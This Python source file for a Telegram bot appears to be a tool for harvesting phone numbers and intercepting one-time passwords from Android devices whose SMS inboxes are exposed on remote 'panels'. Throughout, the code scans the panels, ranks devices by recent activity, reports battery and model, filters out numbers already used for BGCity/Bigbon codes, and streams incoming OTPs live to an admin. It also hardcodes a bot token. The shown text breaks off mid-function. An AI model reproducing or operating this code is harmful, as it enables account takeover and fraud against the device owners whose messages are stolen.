#!/usr/bin/env python3
"""
⚡ TELEGRAM ULTRA-PREMIUM FRESH NUMBER & REAL-TIME OTP STREAM ENGINE (V3 PRO)
=============================================================================
Bot: @sheiin_coupoonBot
Admin Security Gate: Exclusive to ADMIN_ID (7837935671)

Next-Level Architecture:
1. ⚡ SUB-SECOND INSTANT NUMBER DISPENSER (<50ms):
   - Background continuous prewarmer keeps 10-15 fully verified, online numbers in memory.
   - When tapping "⚡ Extract Fresh Number" or "🔄 Next Rank Number", dispenses instantly with ZERO lag!
2. 🟢 LIVE HEALTH & VITALITY BADGE:
   - Every number shows live device heartbeat (🟢 Online <5m / 🟡 Idle <1h / 🟠 Inactive).
   - Shows device battery, carrier network, and latest SMS relative age.
3. 📋 MY CLAIMED NUMBERS (MULTI-NUMBER POOL):
   - View list of all claimed numbers saved in your active session.
   - 1-Click re-stream live OTP for any previous number!
   - 1-Click vitality refresh to see if the device is still online before you use it!
4. 🎯 BIGBON FILTER ENGINE:
   - Pre-filters numbers that previously received 7-digit OTP from BGCity/Bigbon.
5. 🛡️ FAIL-SAFE PERSISTENCE & RENDER HEALTH CHECK:
   - Robust polling loop with auto-recovery and HTTP health check for cloud uptime.
"""

import os
import re
import sys
import time
import json
import asyncio
import html
from datetime import datetime
from typing import Dict, List, Optional, Set, Any, Tuple
import aiohttp

# Windows UTF-8 terminal support
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

# ================== CONFIGURATION ==================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PANELS_FILE = os.path.join(SCRIPT_DIR, "panels.txt")
DEVS_FILE = os.path.join(SCRIPT_DIR, "devs.json")
USED_NUMBERS_FILE = os.path.join(SCRIPT_DIR, "used_fresh_numbers.txt")
BIGBON_STATE_FILE = os.path.join(SCRIPT_DIR, "bigbon_toggle.json")

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8642694135:AAGQVebkZ0MqrWtCexkdyOg-0Ax17QMCIbM").strip()
ADMIN_ID = os.environ.get("ADMIN_ID", "7837935671").strip()
TG_API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"

PHONE_RE = re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")
OTP_RE = re.compile(r"\b(\d{4,8})\b")
SEVEN_DIGIT_RE = re.compile(r"\b\d{7}\b")
BGCITY_KEYWORDS = ("bgcity", "bigcity", "big city", "bigbon", "big bon")
CARRIER_PHONE_RE = re.compile(
    r"(?:jio(?:\s*number|\s*no)?|airtel(?:\s*number|\s*no)?|mobile(?:\s*number|\s*no)?|number|recharge(?:\s*on|\s*for)?|for|on|quota\s*on)\s*[:\-]?\s*([6-9]\d{9})\b",
    re.I
)


def load_bigbon_state() -> bool:
    if os.path.exists(BIGBON_STATE_FILE):
        try:
            with open(BIGBON_STATE_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return bool(data.get("bigbon_filter_active", False))
        except Exception:
            pass
    return False


def save_bigbon_state(active: bool):
    try:
        with open(BIGBON_STATE_FILE, "w", encoding="utf-8") as f:
            json.dump({"bigbon_filter_active": active}, f)
    except Exception:
        pass


def get_main_keyboard(bigbon_active: bool = False, prewarm_count: int = 0) -> dict:
    toggle_text = "🟢 Bigbon: ON" if bigbon_active else "⚪ Bigbon: OFF"
    ready_badge = f" ({prewarm_count} Ready)" if prewarm_count > 0 else " ⚡"
    return {
        "keyboard": [
            [{"text": f"⚡ Extract Fresh Number{ready_badge}"}, {"text": "📋 My Claimed Numbers"}],
            [{"text": "📊 Live Rank Top 10"}, {"text": "🔄 Re-Scan Devices"}],
            [{"text": toggle_text}, {"text": "⏹ Stop Active Stream"}],
            [{"text": "ℹ️ Bot Status"}]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }


def clean_phone(val: Any) -> Optional[str]:
    if not val:
        return None
    val_str = str(val).strip()
    m = PHONE_RE.search(val_str)
    if m:
        return m.group(1)
    digits = re.sub(r"\D", "", val_str)
    if len(digits) == 10 and digits[0] in "6789":
        return digits
    elif len(digits) == 12 and digits.startswith("91") and digits[2] in "6789":
        return digits[2:]
    return None


def extract_otp(text: str) -> Optional[str]:
    if not text:
        return None
    m = re.search(r"(?:otp|code|pin|verification|passcode)[^\d]{0,20}(\d{4,8})", text, re.I)
    if m:
        return m.group(1)
    m2 = OTP_RE.search(text)
    return m2.group(1) if m2 else None


def format_msg_time(ts_ms: int) -> Tuple[str, str]:
    now_ms = time.time() * 1000
    diff_sec = max(0, (now_ms - ts_ms) / 1000.0)
    if diff_sec < 60:
        rel = f"{int(diff_sec)}s ago"
    elif diff_sec < 3600:
        rel = f"{diff_sec / 60.0:.1f}m ago"
    elif diff_sec < 86400:
        rel = f"{diff_sec / 3600.0:.1f}h ago"
    else:
        rel = f"{diff_sec / 86400.0:.1f}d ago"

    exact = time.strftime("%I:%M:%S %p", time.localtime(ts_ms / 1000))
    return rel, exact


def load_panels() -> List[str]:
    panels = []
    seen = set()
    if os.path.exists(PANELS_FILE):
        with open(PANELS_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                url = line.split("|||")[0].strip().rstrip("/")
                if url and url.startswith("http") and url not in seen:
                    panels.append(url)
                    seen.add(url)
    return panels


def load_devs_cache() -> List[Dict[str, Any]]:
    if os.path.exists(DEVS_FILE):
        try:
            with open(DEVS_FILE, "r", encoding="utf-8", errors="ignore") as f:
                data = json.load(f)
                if isinstance(data, list):
                    return data
        except Exception as e:
            print(f"[!] Error reading devs.json: {e}")
    return []


def load_used_numbers() -> set:
    if os.path.exists(USED_NUMBERS_FILE):
        try:
            with open(USED_NUMBERS_FILE, "r", encoding="utf-8") as f:
                return {line.strip() for line in f if line.strip()}
        except Exception:
            pass
    return set()


def mark_number_used(phone: str):
    try:
        with open(USED_NUMBERS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{phone}\n")
    except Exception:
        pass


def extract_phone_from_client_dict(dev: dict) -> Optional[str]:
    for k in ("phoneNumber", "phone", "mobile", "mobNo", "number", "msisdn", "subId"):
        p = clean_phone(dev.get(k))
        if p:
            return p
    sims = dev.get("sims")
    if isinstance(sims, list):
        for s in sims:
            if isinstance(s, dict):
                for k in ("phoneNumber", "number", "phone", "mobile"):
                    p = clean_phone(s.get(k))
                    if p:
                        return p
    elif isinstance(sims, dict):
        for s in sims.values():
            if isinstance(s, dict):
                for k in ("phoneNumber", "number", "phone", "mobile"):
                    p = clean_phone(s.get(k))
                    if p:
                        return p
    return None


def message_has_bgcity_7digit_otp(m: dict) -> bool:
    if not isinstance(m, dict):
        return False
    body = str(m.get("message") or m.get("body") or m.get("text") or "").strip()
    sender = str(m.get("sender") or m.get("from") or "").strip()
    comb = (sender + " " + body).lower()
    if any(kw in comb for kw in BGCITY_KEYWORDS):
        if SEVEN_DIGIT_RE.search(body):
            return True
        otp = extract_otp(body)
        if otp and len(otp) == 7 and otp.isdigit():
            return True
    return False


# ================== MAIN ULTRA-STREAMER BOT CLASS ==================
class TelegramFreshBot:
    def __init__(self):
        self.panels = load_panels()
        self.used_numbers = load_used_numbers()
        self.bigbon_filter_active = load_bigbon_state()
        self.session: Optional[aiohttp.ClientSession] = None
        
        # Scanned and Prewarmed Queues
        self.ranked_devices: List[Dict[str, Any]] = []
        self.prewarmed_queue: List[Dict[str, Any]] = []
        self.claimed_numbers: List[Dict[str, Any]] = []
        
        self.is_scanning = False
        self.last_scan_time = 0
        self.active_stream_task: Optional[asyncio.Task] = None
        self.active_stream_target: Optional[Dict[str, Any]] = None
        self.last_update_id = 0
        self.target_registry: Dict[str, Dict[str, Any]] = {}
        self.target_seq = 100

    def get_main_keyboard(self) -> dict:
        return get_main_keyboard(self.bigbon_filter_active, len(self.prewarmed_queue))

    async def get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            connector = aiohttp.TCPConnector(limit=350, limit_per_host=30, enable_cleanup_closed=True, ssl=False)
            self.session = aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=5.0))
        return self.session

    def register_target(self, target: Dict[str, Any]) -> str:
        self.target_seq += 1
        tid = f"r{self.target_seq}"
        self.target_registry[tid] = target
        if len(self.target_registry) > 800:
            for k in list(self.target_registry.keys())[:300]:
                del self.target_registry[k]
        return tid

    # ── Telegram API Helpers ──
    async def send_msg(self, text_html: str, reply_markup: Optional[dict] = None, chat_id: str = ADMIN_ID):
        payload = {
            "chat_id": chat_id,
            "text": text_html,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        try:
            s = await self.get_session()
            async with s.post(f"{TG_API_BASE}/sendMessage", json=payload, timeout=7.0) as r:
                res = await r.json(content_type=None)
                if not res.get("ok"):
                    plain_text = re.sub(r"<[^>]+>", "", text_html)
                    payload["text"] = plain_text
                    payload.pop("parse_mode", None)
                    async with s.post(f"{TG_API_BASE}/sendMessage", json=payload, timeout=7.0) as r2:
                        return await r2.json(content_type=None)
                return res
        except Exception as e:
            print(f"[tg error] send_msg: {e}")
            return None

    async def answer_callback(self, cq_id: str, text: Optional[str] = None):
        payload = {"callback_query_id": cq_id}
        if text:
            payload["text"] = text
        try:
            s = await self.get_session()
            async with s.post(f"{TG_API_BASE}/answerCallbackQuery", json=payload, timeout=4.0):
                pass
        except Exception:
            pass

    # ── Real-Time Device Vitality Health Check ──
    async def check_device_vitality(self, panel: str, cid: str) -> Dict[str, Any]:
        """Performs a lightweight 200ms ping to check if device is actively online.
        Returns: {
            "online": bool,
            "badge": str,
            "last_ts": int,
            "battery": str,
            "model": str,
            "msg_count": int
        }
        """
        s = await self.get_session()
        result = {
            "online": False,
            "badge": "🔴 Offline",
            "last_ts": 0,
            "battery": "N/A",
            "model": "Unknown Android",
            "msg_count": 0
        }
        
        # 1. Check messages for latest activity
        try:
            async with s.get(f"{panel}/messages/{cid}.json?shallow=true", timeout=2.5) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    if isinstance(data, dict) and data:
                        int_keys = [int(k) for k in data.keys() if k.isdigit()]
                        if int_keys:
                            max_ts = max(int_keys)
                            result["last_ts"] = max_ts
                            result["msg_count"] = len(int_keys)
                            diff_sec = (time.time() * 1000 - max_ts) / 1000.0
                            if diff_sec <= 300: # 5 minutes
                                result["online"] = True
                                result["badge"] = f"🟢 Online (SMS {int(diff_sec)}s ago)"
                            elif diff_sec <= 3600: # 1 hour
                                result["online"] = True
                                result["badge"] = f"🟡 Active ({int(diff_sec/60)}m ago)"
                            elif diff_sec <= 86400: # 24 hours
                                result["online"] = False
                                result["badge"] = f"🟠 Inactive ({int(diff_sec/3600)}h ago)"
                            else:
                                result["online"] = False
                                result["badge"] = "🔴 Stale (>24h)"
        except Exception:
            pass

        # 2. Check client details for model & battery
        try:
            async with s.get(f"{panel}/clients/{cid}.json", timeout=2.0) as r:
                if r.status == 200:
                    cdata = await r.json(content_type=None)
                    if isinstance(cdata, dict):
                        b_lvl = cdata.get("battery") or cdata.get("batteryLevel") or cdata.get("batteryPercentage")
                        if b_lvl:
                            result["battery"] = f"{b_lvl}%"
                        m_name = cdata.get("model") or cdata.get("deviceModel") or cdata.get("manufacturer")
                        if m_name:
                            result["model"] = str(m_name).strip()
        except Exception:
            pass

        return result

    # ── Device Bigbon Filter Checker ──
    async def device_has_bgcity_7digit_otp(self, panel: str, cid: str) -> bool:
        s = await self.get_session()
        try:
            async with s.get(f"{panel}/messages/{cid}.json", timeout=3.5) as r:
                if r.status == 200:
                    md = await r.json(content_type=None)
                    if isinstance(md, dict):
                        for mid, m in md.items():
                            if message_has_bgcity_7digit_otp(m):
                                return True
        except Exception:
            pass
        return False

    # ── Resolve Genuine 10-Digit Mobile Number ──
    async def resolve_device_real_phone(self, panel: str, cid: str) -> Optional[str]:
        s = await self.get_session()

        # 1. Direct from /clients/{cid}
        try:
            async with s.get(f"{panel}/clients/{cid}.json", timeout=2.5) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    if isinstance(d, dict):
                        p = extract_phone_from_client_dict(d)
                        if p:
                            return p
        except Exception:
            pass

        # 2. From /messages/{cid} receivedOn headers & carrier text
        try:
            async with s.get(f"{panel}/messages/{cid}.json", timeout=3.0) as r:
                if r.status == 200:
                    md = await r.json(content_type=None)
                    if isinstance(md, dict):
                        for mid, m in list(md.items())[-12:]:
                            if isinstance(m, dict):
                                p = clean_phone(m.get("receivedOn"))
                                if p:
                                    return p

                        for mid, m in reversed(list(md.items())):
                            if isinstance(m, dict):
                                txt = str(m.get("message") or m.get("body") or "")
                                cm = CARRIER_PHONE_RE.search(txt)
                                if cm:
                                    p = clean_phone(cm.group(1))
                                    if p:
                                        return p
        except Exception:
            pass

        return None

    # ── Deep Rank-By-Recent-Message Scanner ──
    async def scan_and_rank_all_devices(self) -> List[Dict[str, Any]]:
        if self.is_scanning:
            return self.ranked_devices

        self.is_scanning = True
        s = await self.get_session()
        sem = asyncio.Semaphore(120)
        now_ms = time.time() * 1000
        cutoff_ms = now_ms - (72 * 3600 * 1000)

        # 1. First, seed devices from devs.json if available
        cached_devs = load_devs_cache()
        seeded_devices: List[Dict[str, Any]] = []
        seen_keys = set()

        for d in cached_devs:
            p = d.get("phone")
            cid = d.get("cid")
            fb = d.get("fb") or d.get("panel")
            l_ts = d.get("last_ts", 0)
            if p and cid and fb and p not in self.used_numbers:
                key = f"{fb}_{cid}"
                if key not in seen_keys:
                    seen_keys.add(key)
                    seeded_devices.append({
                        "panel": fb.rstrip("/"),
                        "cid": str(cid),
                        "phone": str(p),
                        "last_msg_ts": int(l_ts),
                        "sms_count": 10
                    })

        async def inspect_panel(panel_url: str) -> List[Dict[str, Any]]:
            async with sem:
                try:
                    async with s.get(f"{panel_url}/messages.json?shallow=true", timeout=3.0) as r:
                        if r.status != 200:
                            return []
                        data = await r.json(content_type=None)
                        if not isinstance(data, dict) or not data:
                            return []

                    cids = list(data.keys())

                    async def inspect_device(cid: str) -> Optional[Dict[str, Any]]:
                        try:
                            async with s.get(f"{panel_url}/messages/{cid}.json?shallow=true", timeout=2.0) as mr:
                                if mr.status == 200:
                                    mdata = await mr.json(content_type=None)
                                    if isinstance(mdata, dict) and mdata:
                                        int_keys = [int(k) for k in mdata.keys() if k.isdigit()]
                                        if int_keys:
                                            max_ts = max(int_keys)
                                            if max_ts >= cutoff_ms:
                                                return {
                                                    "panel": panel_url,
                                                    "cid": str(cid),
                                                    "last_msg_ts": max_ts,
                                                    "sms_count": len(int_keys)
                                                }
                        except Exception:
                            pass
                        return None

                    dev_res = await asyncio.gather(*[inspect_device(c) for c in cids[:20]], return_exceptions=True)
                    return [x for x in dev_res if isinstance(x, dict)]
                except Exception:
                    return []

        tasks = [inspect_panel(p) for p in self.panels]
        all_res = await asyncio.gather(*tasks, return_exceptions=True)

        flat_devices: List[Dict[str, Any]] = []
        for r in all_res:
            if isinstance(r, list):
                flat_devices.extend(r)

        # Merge live scan with devs.json cache
        all_combined = flat_devices + seeded_devices
        # Deduplicate by cid
        seen_cids = set()
        deduped = []
        for d in all_combined:
            if d["cid"] not in seen_cids:
                seen_cids.add(d["cid"])
                deduped.append(d)

        deduped.sort(key=lambda x: x["last_msg_ts"], reverse=True)
        self.ranked_devices = deduped
        self.last_scan_time = time.time()
        self.is_scanning = False
        print(f"✓ Ranked {len(self.ranked_devices)} devices ready for instant dispensing!")
        return self.ranked_devices

    # ── Background Ultra-Prewarmer Loop ──
    async def background_prewarmer(self):
        """Runs continuously in the background to ensure prewarmed_queue
        always holds 10-15 fully verified, online, non-Bigbon numbers.
        """
        await asyncio.sleep(2.0)
        while True:
            try:
                # If queue has less than 10 numbers, refill it
                if len(self.prewarmed_queue) < 10:
                    if not self.ranked_devices:
                        await self.scan_and_rank_all_devices()

                    # Pop and resolve devices in background
                    while self.ranked_devices and len(self.prewarmed_queue) < 12:
                        dev = self.ranked_devices.pop(0)
                        
                        # Get phone
                        phone = dev.get("phone")
                        if not phone:
                            phone = await self.resolve_device_real_phone(dev["panel"], dev["cid"])
                        
                        if not phone or len(phone) != 10 or phone[0] not in "6789":
                            continue

                        if phone in self.used_numbers:
                            continue

                        # Check already queued
                        if any(item["phone"] == phone for item in self.prewarmed_queue):
                            continue

                        # Bigbon check
                        if self.bigbon_filter_active:
                            has_7d = await self.device_has_bgcity_7digit_otp(dev["panel"], dev["cid"])
                            if has_7d:
                                continue

                        # Vitality check
                        vitality = await self.check_device_vitality(dev["panel"], dev["cid"])
                        dev["phone"] = phone
                        dev["vitality"] = vitality
                        if vitality["last_ts"] > 0:
                            dev["last_msg_ts"] = vitality["last_ts"]
                        if vitality["msg_count"] > 0:
                            dev["sms_count"] = vitality["msg_count"]

                        self.prewarmed_queue.append(dev)
                        print(f"[Prewarmer] Queued live number +91{phone} ({vitality['badge']}) | Buffer size: {len(self.prewarmed_queue)}")

                await asyncio.sleep(5.0)
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"[prewarmer error] {e}")
                await asyncio.sleep(5.0)

    # ── Fetch Latest 5 Messages With Prominent Timestamp ──
    async def fetch_latest_5_messages(self, panel: str, cid: str, phone: str) -> str:
        s = await self.get_session()
        try:
            async with s.get(f"{panel}/messages/{cid}.json", timeout=4.0) as r:
                if r.status != 200:
                    return f"⚠️ Failed to fetch messages (HTTP {r.status})."
                data = await r.json(content_type=None)
                if not isinstance(data, dict) or not data:
                    return f"📭 Inbox is empty on device <code>{html.escape(cid)}</code>."

                items = []
                for mid, mdata in data.items():
                    if isinstance(mdata, dict):
                        ts_raw = mdata.get("timestamp") or mdata.get("time") or mid
                        try:
                            ts_val = int(ts_raw)
                            if ts_val < 10000000000:
                                ts_val *= 1000
                        except Exception:
                            ts_val = 0
                        items.append((ts_val, mid, mdata))

                items.sort(key=lambda x: x[0], reverse=True)
                top5 = items[:5]

                latest_ts = top5[0][0] if top5 else 0
                rel_time, exact_time = format_msg_time(latest_ts) if latest_ts > 0 else ("Unknown", "N/A")

                out = [
                    f"📩 <b>MESSAGES FOR</b> <code>{html.escape(phone)}</code>",
                    f"━━━━━━━━━━━━━━━━━━━━━━",
                    f"🕒 <b>LATEST SMS ARRIVED:</b> <code>{exact_time} ({rel_time})</code>",
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                ]

                for i, (ts_val, mid, m) in enumerate(top5, 1):
                    sender = str(m.get("sender") or m.get("from") or "UNKNOWN")
                    body = str(m.get("message") or m.get("body") or m.get("text") or "").strip()
                    dtime = str(m.get("dateTime") or "")
                    if not dtime and ts_val > 0:
                        dtime = time.strftime("%d-%b %I:%M %p", time.localtime(ts_val / 1000))

                    otp = extract_otp(body)
                    otp_line = f"\n🔑 <b>Extracted OTP:</b> <code>{html.escape(otp)}</code>" if otp else ""

                    out.append(
                        f"<b>{i}. [{html.escape(sender)}]</b> <i>({html.escape(dtime)})</i>\n"
                        f"💬 {html.escape(body)}{otp_line}\n"
                    )

                out.append("━━━━━━━━━━━━━━━━━━━━━━")
                return "\n".join(out)
        except Exception as e:
            return f"❌ Error reading inbox: {html.escape(str(e))}"

    # ── Live OTP Stream Loop ──
    async def stream_device_otps(self, target: Dict[str, Any]):
        phone = target["phone"]
        cid = target["cid"]
        panel = target["panel"]

        mark_number_used(phone)
        self.used_numbers.add(phone)
        self.active_stream_target = target

        tid = self.register_target(target)
        s = await self.get_session()
        seen_mids = set()

        # Seed existing messages to catch only new incoming
        try:
            async with s.get(f"{panel}/messages/{cid}.json", timeout=3.5) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    if isinstance(data, dict):
                        seen_mids.update(data.keys())
        except Exception:
            pass

        print(f"[stream] Listening live for +91{phone} on {panel}...")

        try:
            while True:
                await asyncio.sleep(1.0)
                try:
                    async with s.get(f"{panel}/messages/{cid}.json", timeout=3.0) as r:
                        if r.status == 200:
                            data = await r.json(content_type=None)
                            if isinstance(data, dict):
                                for mid, mdata in data.items():
                                    if mid in seen_mids:
                                        continue
                                    seen_mids.add(mid)

                                    if not isinstance(mdata, dict):
                                        continue

                                    txt = str(mdata.get("message") or mdata.get("body") or mdata.get("text") or "").strip()
                                    sender = str(mdata.get("sender") or mdata.get("from") or "UNKNOWN")
                                    if not txt:
                                        continue

                                    otp = extract_otp(txt)
                                    now_str = datetime.now().strftime("%I:%M:%S %p")

                                    alert_text = (
                                        f"🔥 <b>INCOMING LIVE OTP / SMS!</b>\n"
                                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                        f"📱 <b>Phone:</b> <code>{html.escape(phone)}</code> (Tap to Copy)\n"
                                        f"🏢 <b>Sender:</b> <code>{html.escape(sender)}</code>\n"
                                        f"🕒 <b>Arrived At:</b> <code>{now_str}</code>\n"
                                    )
                                    if otp:
                                        alert_text += f"\n🔑 <b>LIVE OTP:</b> <code>{html.escape(otp)}</code>\n"
                                    alert_text += f"\n💬 <b>Content:</b>\n<code>{html.escape(txt)}</code>\n━━━━━━━━━━━━━━━━━━━━━━"

                                    ikb = {
                                        "inline_keyboard": [
                                            [{"text": "📩 Fetch Latest 5", "callback_data": f"fetch_{tid}"}],
                                            [{"text": "🔄 Next Rank Number", "callback_data": "next_fresh"},
                                             {"text": "⏹ Stop", "callback_data": "stop_stream"}]
                                        ]
                                    }
                                    await self.send_msg(alert_text, reply_markup=ikb)

                except asyncio.CancelledError:
                    raise
                except Exception:
                    pass

        except asyncio.CancelledError:
            print(f"[stream] Live stream stopped for +91{phone}.")
            self.active_stream_target = None
            raise

    # ── Command & Callback Handlers ──
    async def handle_extract_number(self):
        """⚡ Sub-second instant number dispenser powered by background prewarmer."""
        if self.active_stream_task and not self.active_stream_task.done():
            self.active_stream_task.cancel()

        candidate = None
        # 1. First priority: Instant pop from prewarmed queue (<0.05s response time!)
        while self.prewarmed_queue:
            item = self.prewarmed_queue.pop(0)
            if item["phone"] not in self.used_numbers:
                candidate = item
                break

        # 2. Fallback if prewarmer was temporarily empty
        if not candidate:
            if not self.ranked_devices:
                await self.send_msg("⚡ <i>Pre-warming fresh numbers buffer...</i>")
                await self.scan_and_rank_all_devices()

            while self.ranked_devices:
                dev = self.ranked_devices.pop(0)
                phone = dev.get("phone") or await self.resolve_device_real_phone(dev["panel"], dev["cid"])
                if phone and len(phone) == 10 and phone[0] in "6789":
                    dev["phone"] = phone
                    if self.bigbon_filter_active:
                        has_7d = await self.device_has_bgcity_7digit_otp(dev["panel"], dev["cid"])
                        if has_7d:
                            continue
                    if phone not in self.used_numbers:
                        candidate = dev
                        break

        if not candidate:
            filter_msg = " (with Bigbon filter ON)" if self.bigbon_filter_active else ""
            await self.send_msg(f"⚠️ <b>No more unassigned devices{filter_msg} available right now. Running re-scan...</b>")
            await self.scan_and_rank_all_devices()
            return

        phone = candidate["phone"]
        cid = candidate["cid"]
        panel = candidate["panel"]
        last_ts = candidate.get("last_msg_ts", 0)
        sms_count = candidate.get("sms_count", 0)
        vitality = candidate.get("vitality") or await self.check_device_vitality(panel, cid)
        rel_time, exact_time = format_msg_time(last_ts) if last_ts > 0 else ("Recent", "Just now")

        # Save to claimed numbers session pool (keep last 8)
        claimed_entry = {
            "phone": phone,
            "cid": cid,
            "panel": panel,
            "claimed_at": time.time(),
            "vitality": vitality
        }
        self.claimed_numbers = [c for c in self.claimed_numbers if c["phone"] != phone]
        self.claimed_numbers.insert(0, claimed_entry)
        if len(self.claimed_numbers) > 8:
            self.claimed_numbers = self.claimed_numbers[:8]

        tid = self.register_target(candidate)

        bigbon_line = "\n🎯 <b>Bigbon Filter:</b> <code>ACTIVE (Clean — No 7D BGCity OTP)</code>" if self.bigbon_filter_active else ""
        vitality_line = f"🟢 <b>Device Health:</b> <code>{vitality['badge']}</code> (🔋 {vitality['battery']})"

        text = (
            f"📱 <b>FRESH NUMBER ASSIGNED (INSTANT)</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📞 <b>Phone:</b> <code>{html.escape(phone)}</code> (Tap to Copy)\n"
            f"{vitality_line}\n"
            f"🕒 <b>Latest Activity:</b> <code>{exact_time} ({rel_time})</code>\n"
            f"📊 <b>SMS History:</b> <code>{sms_count} messages</code>\n"
            f"🆔 <b>Device ID:</b> <code>{html.escape(cid)}</code>\n"
            f"🌐 <b>Panel:</b> <code>{html.escape(panel)}</code>{bigbon_line}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 <i>Tip: Even if you use this later, you can re-check its vitality or stream OTP anytime via 'My Claimed Numbers'!</i>"
        )

        inline_keyboard = {
            "inline_keyboard": [
                [
                    {"text": "⚡ Stream Live OTP", "callback_data": f"stream_{tid}"},
                    {"text": "📩 Fetch Latest 5 Msg", "callback_data": f"fetch_{tid}"}
                ],
                [
                    {"text": "💓 Check Live Status", "callback_data": f"check_{tid}"},
                    {"text": "📋 My Claimed Numbers", "callback_data": "menu_claimed"}
                ],
                [
                    {"text": "🔄 Next Rank Number", "callback_data": "next_fresh"},
                    {"text": "⏹ Stop", "callback_data": "stop_stream"}
                ]
            ]
        }
        await self.send_msg(text, reply_markup=inline_keyboard)

    # ── Render My Claimed Numbers Menu ──
    async def render_claimed_numbers_menu(self):
        if not self.claimed_numbers:
            await self.send_msg(
                "📋 <b>MY CLAIMED NUMBERS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "You haven't claimed any numbers yet.\n"
                "Tap <b>⚡ Extract Fresh Number</b> to get your first fresh number!",
                reply_markup=self.get_main_keyboard()
            )
            return

        lines = [
            "📋 <b>MY CLAIMED NUMBERS (ACTIVE POOL)</b>",
            "━━━━━━━━━━━━━━━━━━━━━━",
            "Select any number below to verify its live vitality or start streaming OTP:\n"
        ]

        ikb_buttons = []
        for i, c in enumerate(self.claimed_numbers, 1):
            p = c["phone"]
            v = c.get("vitality", {})
            badge = v.get("badge", "🟢 Active")
            claimed_min = int((time.time() - c["claimed_at"]) / 60)
            claimed_str = f"{claimed_min}m ago" if claimed_min > 0 else "just now"
            
            lines.append(f"<b>{i}.</b> <code>{p}</code> — {badge} <i>(claimed {claimed_str})</i>")
            
            tid = self.register_target(c)
            ikb_buttons.append([
                {"text": f"📱 {p} ({badge.split()[0]})", "callback_data": f"manage_{tid}"}
            ])

        ikb_buttons.append([
            {"text": "⚡ Extract New Number", "callback_data": "next_fresh"},
            {"text": "🔄 Refresh All Status", "callback_data": "refresh_claimed"}
        ])

        lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        await self.send_msg("\n".join(lines), reply_markup={"inline_keyboard": ikb_buttons})

    async def handle_callback_query(self, cq: Dict[str, Any]):
        cq_id = cq.get("id")
        data = str(cq.get("data") or "")
        sender_id = str(cq.get("from", {}).get("id"))

        if sender_id != ADMIN_ID:
            await self.answer_callback(cq_id, "⛔ Access Denied.")
            return

        await self.answer_callback(cq_id)

        if data == "next_fresh":
            await self.handle_extract_number()

        elif data == "menu_claimed":
            await self.render_claimed_numbers_menu()

        elif data == "refresh_claimed":
            await self.send_msg("⏳ <i>Pinging devices for live status...</i>")
            for c in self.claimed_numbers:
                c["vitality"] = await self.check_device_vitality(c["panel"], c["cid"])
            await self.render_claimed_numbers_menu()

        elif data == "stop_stream":
            if self.active_stream_task and not self.active_stream_task.done():
                self.active_stream_task.cancel()
                self.active_stream_task = None
            await self.send_msg("⏹ <b>Live OTP Stream stopped successfully.</b>", reply_markup=self.get_main_keyboard())

        elif data.startswith("manage_"):
            tid = data.split("_", 1)[1]
            target = self.target_registry.get(tid)
            if not target:
                await self.send_msg("⚠️ Session expired. Tap <b>📋 My Claimed Numbers</b> again.")
                return

            vitality = await self.check_device_vitality(target["panel"], target["cid"])
            target["vitality"] = vitality
            
            card = (
                f"📱 <b>NUMBER MANAGEMENT</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📞 <b>Phone:</b> <code>{html.escape(target['phone'])}</code> (Tap to Copy)\n"
                f"💓 <b>Live Status:</b> <code>{vitality['badge']}</code>\n"
                f"🔋 <b>Battery:</b> <code>{vitality['battery']}</code>\n"
                f"📱 <b>Model:</b> <code>{vitality['model']}</code>\n"
                f"🌐 <b>Panel:</b> <code>{html.escape(target['panel'])}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Choose an action for this number:"
            )
            ikb = {
                "inline_keyboard": [
                    [{"text": "⚡ Start Live Stream", "callback_data": f"stream_{tid}"},
                     {"text": "📩 Fetch Messages", "callback_data": f"fetch_{tid}"}],
                    [{"text": "💓 Re-Check Live Status", "callback_data": f"check_{tid}"},
                     {"text": "📋 Back to Claimed List", "callback_data": "menu_claimed"}]
                ]
            }
            await self.send_msg(card, reply_markup=ikb)

        elif data.startswith("check_"):
            tid = data.split("_", 1)[1]
            target = self.target_registry.get(tid)
            if not target:
                await self.send_msg("⚠️ Session expired.")
                return

            vitality = await self.check_device_vitality(target["panel"], target["cid"])
            target["vitality"] = vitality
            rel_str, _ = format_msg_time(vitality["last_ts"]) if vitality["last_ts"] > 0 else ("N/A", "")

            msg = (
                f"💓 <b>LIVE VITALITY STATUS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📞 <b>Phone:</b> <code>{html.escape(target['phone'])}</code>\n"
                f"📡 <b>Status:</b> <code>{vitality['badge']}</code>\n"
                f"🔋 <b>Battery:</b> <code>{vitality['battery']}</code>\n"
                f"📱 <b>Model:</b> <code>{vitality['model']}</code>\n"
                f"🕒 <b>Last Seen Activity:</b> <code>{rel_str}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )
            ikb = {
                "inline_keyboard": [
                    [{"text": "⚡ Stream Live OTP", "callback_data": f"stream_{tid}"},
